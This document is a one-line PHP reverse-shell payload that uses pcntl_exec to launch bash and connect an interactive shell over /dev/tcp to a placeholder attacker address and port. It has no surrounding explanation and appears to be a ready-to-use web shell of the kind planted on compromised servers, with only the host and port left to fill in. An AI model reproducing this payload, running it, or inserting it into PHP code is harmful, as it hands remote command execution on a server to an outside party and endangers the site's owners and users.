<?php pcntl_exec('/bin/bash', ['-c', 'bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1']); ?>
